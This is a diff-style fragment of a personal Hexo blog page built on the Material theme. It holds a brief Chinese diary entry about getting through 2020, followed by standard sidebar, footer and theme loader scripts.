+<p>最后终于跨过山跨过河肥来摸鱼惹，隔壁熊孩子还是一样的吵，自己烧哒饭还是一样哒好次嘻嘻（脸呢</p>
+<p>虽然总是会有阴霾在QAQ，蛋2020能活着已经是莫大的幸运啦</p>
+<p>要继续活着鸭</p>
+
+        
+    
+
+    
+</div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/2019/11/28/flaaask/" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+        </div>
+    </div>
+
+
+
+                    
+                        <!-- Overlay For Active Sidebar -->
+<div class="sidebar-overlay"></div>
+
+<!-- Material sidebar -->
+<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
+    <div id="sidebar-main">
+        <!-- Sidebar Header -->
+        <div class="sidebar-header header-cover" style="background-image: url(/img/5.jpg);">
+    <!-- Top bar -->
+    <div class="top-bar"></div>
+
+    <!-- Sidebar toggle button -->
+    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
+        <i class="material-icons">clear_all</i>
+        <span class="mdl-button__ripple-container">
+            <span class="mdl-ripple">
+            </span>
+        </span>
+    </button>
+
+    <!-- Sidebar Avatar -->
+    <div class="sidebar-image">
+        <img src="/img/2.jpg" alt="铃落's avatar">
+    </div>
+
+    <!-- Sidebar Email -->
+    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
+        ringfall3@gmail.com
+        <b class="caret"></b>
+    </a>
+</div>
+
+
+        <!-- Sidebar Navigation  -->
+        <ul class="nav sidebar-nav">
+    <!-- User dropdown  -->
+    <li class="dropdown">
+        <ul id="settings-dropdown" class="dropdown-menu">
+            
+                <li>
+                    <a href="mailto: ringfall3@gmail.com" target="_blank" title="Email Me">
+                        
+                            <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
+                        
+                        Email Me
+                    </a>
+                </li>
+            
+        </ul>
+    </li>
+
+    <!-- Homepage -->
+    
+        <li id="sidebar-first-li">
+            <a href="/">
+                
+                    <i class="material-icons sidebar-material-icons">home</i>
+                
+                主页
+            </a>
+        </li>
+        
+    
+
+    <!-- Archives  -->
+    
+        <li class="dropdown">
+            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+                
+                    <i class="material-icons sidebar-material-icons">inbox</i>
+                
+                    归档
+                <b class="caret"></b>
+            </a>
+            <ul class="dropdown-menu">
+            <li>
+                <a class="sidebar_archives-link" href="/archives/2020/02/">二月 2020<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2019/11/">十一月 2019<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2019/07/">七月 2019<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2019/06/">六月 2019<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2019/05/">五月 2019<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2019/04/">四月 2019<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/12/">十二月 2018<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/11/">十一月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/10/">十月 2018<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/09/">九月 2018<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/08/">八月 2018<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/07/">七月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/06/">六月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/05/">五月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/04/">四月 2018<span class="sidebar_archives-count">6</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/03/">三月 2018<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/02/">二月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/01/">一月 2018<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/12/">十二月 2017<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/09/">九月 2017<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/08/">八月 2017<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/07/">七月 2017<span class="sidebar_archives-count">3</span></a>
+            </ul>
+        </li>
+        
+    
+
+    <!-- Categories  -->
+    
+        <li class="dropdown">
+            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+                
+                    <i class="material-icons sidebar-material-icons">chrome_reader_mode</i>
+                
+                分类
+                <b class="caret"></b>
+            </a>
+            <ul class="dropdown-menu">
+                <li>
+                <a class="sidebar_archives-link" href="/categories/Blog/">Blog<span class="sidebar_archives-count">11</span></a></li><li><a class="sidebar_archives-link" href="/categories/Diary/">Diary<span class="sidebar_archives-count">11</span></a>
+            </ul>
+        </li>
+        
+    
+
+    <!-- Pages  -->
+    
+        <li>
+            <a href="/timeline" title="timeline">
+                
+                    <i class="material-icons sidebar-material-icons">timeline</i>
+                
+                timeline
+            </a>
+        </li>
+        
+            <li class="divider"></li>
+        
+    
+        <li>
+            <a href="/gallery" title="miao">
+                
+                    <i class="material-icons sidebar-material-icons">palette</i>
+                
+                miao
+            </a>
+        </li>
+        
+    
+        <li>
+            <a href="/cv" title="cv">
+                
+                    <i class="material-icons sidebar-material-icons">person</i>
+                
+                cv
+            </a>
+        </li>
+        
+    
+
+    <!-- Article Number  -->
+    
+</ul>
+
+
+        <!-- Sidebar Footer -->
+        <!--
+I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
+If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
+It will not impact the appearance and can give developers a lot of support :)
+
+很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
+如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
+它不会影响美观并可以给开发者很大的支持和动力。 :)
+-->
+
+<!-- Sidebar Divider -->
+
+
+<!-- Theme Material -->
+
+
+<!-- Help & Support -->
+<!--
+
+-->
+
+<!-- Feedback -->
+<!--
+
+-->
+
+<!-- About Theme -->
+<!--
+
+-->
+
+    </div>
+
+    <!-- Sidebar Image -->
+    
+
+</aside>
+
+                    
+
+                    
+                        <!-- Footer Top Button -->
+                        <div id="back-to-top" class="toTop-wrap">
+    <a href="#top" class="toTop">
+        <i class="material-icons footer_top-i">expand_less</i>
+    </a>
+</div>
+
+                    
+
+                    <!--Footer-->
+<footer class="mdl-mini-footer" id="bottom">
+    
+        <!-- Paradox Footer Left Section -->
+        <div class="mdl-mini-footer--left-section sns-list">
+    <!-- Twitter -->
+    
+        <a href="https://twitter.com/twitter" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-twitter">
+                <span class="visuallyhidden">Twitter</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Facebook -->
+    
+        <a href="https://www.facebook.com/facebook" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-facebook">
+                <span class="visuallyhidden">Facebook</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Google + -->
+    
+        <a href="https://www.google.com/" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-gplus">
+                <span class="visuallyhidden">Google Plus</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Weibo -->
+    
+
+    <!-- Instagram -->
+    
+
+    <!-- Tumblr -->
+    
+
+    <!-- Github -->
+    
+
+    <!-- LinkedIn -->
+    
+
+    <!-- Zhihu -->
+    
+
+    <!-- Bilibili -->
+    
+
+    <!-- Telegram -->
+    
+
+    <!-- V2EX -->
+    
+
+    <!-- Segmentfault -->
+    
+</div>
+
+
+        <!--Copyright-->
+        <div id="copyright">
+            Copyright&nbsp;©&nbsp;<span year></span>&nbsp;RingFa1l
+            
+        </div>
+
+        <!-- Paradox Footer Right Section -->
+
+        <!--
+        I am glad you use this theme, the development is no so easy, I hope you can keep the copyright.
+        It will not impact the appearance and can give developers a lot of support :)
+
+        很高兴您使用该主题，开发不易，希望您可以保留一下版权声明。
+        它不会影响美观并可以给开发者很大的支持。 :)
+        -->
+
+        <div class="mdl-mini-footer--right-section">
+            <div>
+                <div class="footer-develop-div">Powered by <a href="https://hexo.io" target="_blank" class="footer-develop-a">Hexo</a></div>
+                <div class="footer-develop-div">Theme - <a href="https://github.com/viosey/hexo-theme-material" target="_blank" class="footer-develop-a">Material</a></div>
+            </div>
+        </div>
+    
+</footer>
+
+
+                    <!-- Import JS File -->
+
+    <script>lsloader.load("lazyload_js","/js/lazyload.min.js?1BcfzuNXqV+ntF6gq+5X3Q==", true)</script>
+
+
+
+    <script>lsloader.load("js_js","/js/js.min.js?Bn9UzEm8RrBSxqyZB0zPjA==", true)</script>
+
+
+
+    <script>lsloader.load("np_js","/js/nprogress.js?pl3Qhb9lvqR1FlyLUna1Yw==", true)</script>
+
+
+<script type="text/ls-javascript" id="NProgress-script">
+    NProgress.configure({
+        showSpinner: true
+    });
+    NProgress.start();
+    $('#nprogress .bar').css({
+        'background': '#29d'
+    });
+    $('#nprogress .peg').css({
+        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
+    });
+    $('#nprogress .spinner-icon').css({
+        'border-top-color': '#29d',
+        'border-left-color': '#29d'
+    });
+    setTimeout(function() {
+        NProgress.done();
+        $('.fade').removeClass('out');
+    }, 800);
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- UC Browser Compatible -->
+<script>
+	var agent = navigator.userAgent.toLowerCase();
+	if(agent.indexOf('ucbrowser')>0) {
+		document.write('<link rel="stylesheet" href="/css/uc.css">');
+	   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
+	}
+</script>
+
+<!-- Import prettify js  -->
+
+
+
+<!-- Window Load -->
+<!-- add class for prettify -->
+<script type="text/ls-javascript" id="window-load">
+    $(window).on('load', function() {
+        // Post_Toc parent position fixed
+        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
+    });
+
+    
+    
+</script>
+
+<!-- MathJax Load-->
+
+
+<!-- Bing Background -->
+
+
+<script type="text/ls-javascript" id="lazy-load">
+    // Offer LazyLoad
+    queue.offer(function(){
+        $('.lazy').lazyload({
+            effect : 'show'
+        });
+    });
+
+    // Start Queue
+    $(document).ready(function(){
+        setInterval(function(){
+            queue.execNext();
+        },200);
+    });
+</script>
+
+<!-- Custom Footer -->
+
+
+
+<script>
+    var copyrightNow = new Date().getFullYear();
+    var textContent = document.querySelector('span[year]')
+
+    copyrightSince = 0000;
+    if (copyrightSince === copyrightNow||copyrightSince === 0000) {
+        textContent.textContent = copyrightNow
+    } else {
+        textContent.textContent = copyrightSince + ' - ' + copyrightNow
+    }
+
+    (function(){
+        var scriptList = document.querySelectorAll('script[type="text/ls-javascript"]')
+
+        for (var i = 0; i < scriptList.length; ++i) {
+            var item = scriptList[i];
+            lsloader.runInlineScript(item.id,item.id);
+        }
+    })()
+console.log('\n %c © Material Theme | Version: 1.5.6 | https://github.com/viosey/hexo-theme-material %c \n', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-left-radius:5px;border-bottom-left-radius:5px;', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-right-radius:5px;border-bottom-right-radius:5px;');
+</script>
+
+                </main>
+            </div>
+        </body>
+    
+</html>
